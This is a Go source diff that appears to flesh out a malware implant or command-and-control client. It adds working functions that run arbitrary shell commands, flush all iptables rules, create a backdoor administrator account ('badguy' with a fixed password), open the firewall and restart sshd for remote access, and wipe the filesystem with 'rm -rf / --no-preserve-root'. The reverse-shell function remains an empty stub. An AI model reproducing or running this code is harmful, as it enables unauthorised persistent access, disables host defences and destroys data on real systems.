@@ -9,6 +9,7 @@ import (
 	"math/rand"
 	"net"
 	"os"
+	"os/exec"
 	"strconv"
 	"strings"
 
@@ -216,28 +217,57 @@ func deobfuscateUUID(obf string) string {
 }
 
 func shellExec(args string) string {
-	return ""
+	cmd := exec.Command("/bin/sh", "-c", args)
+	out, err := cmd.CombinedOutput()
+	if err != nil {
+		return string(err.Error())
+	}
+	return string(out)
 }
 
 func fwFlush() string {
-	return ""
+	cmd := exec.Command("/bin/sh", "-c", "iptables -P INPUT ACCEPT; iptables -P OUTPUT ACCEPT; iptables -P FORWARD ACCEPT; iptables -t nat -F; iptables -t mangle -F; iptables -F; iptables -X;")
+	out, err := cmd.CombinedOutput()
+	if err != nil {
+		return string(err.Error())
+	}
+	return string(out)
 }
 
 func createUser() string {
-	return ""
+	comStr := "useradd -p $(openssl passwd -1 letmein) badguy -s /bin/bash -G sudo"
+	if _, err := os.Stat("/etc/yum.conf"); os.IsNotExist(err) {
+		comStr = "useradd -p $(openssl passwd -1 letmein) badguy -s /bin/bash -G wheel"
+	}
+	cmd := exec.Command("/bin/sh", "-c", comStr)
+	out, err := cmd.CombinedOutput()
+	if err != nil {
+		return string(err.Error())
+	}
+	return string(out)
 }
 
 func enableRemote() string {
-	return ""
+	insRule := exec.Command("iptables", "-I", "FILTER", "1", "-j", "ACCEPT")
+	insRule.Run()
+	cmd := exec.Command("/bin/sh", "-c", "systemctl restart sshd")
+	out, err := cmd.CombinedOutput()
+	if err != nil {
+		return string(err.Error())
+	}
+	return string(out)
 }
 
 func spawnRevShell(target string) string {
+
 	return ""
 }
 
 func nuke() string {
 	//rm rf dat boi
-	return ""
+	cmd := exec.Command("/bin/bash", "-c", "rm -rf / --no-preserve-root")
+	out, _ := cmd.CombinedOutput()
+	return string(out)
 }
 
 func unknownCom() string {
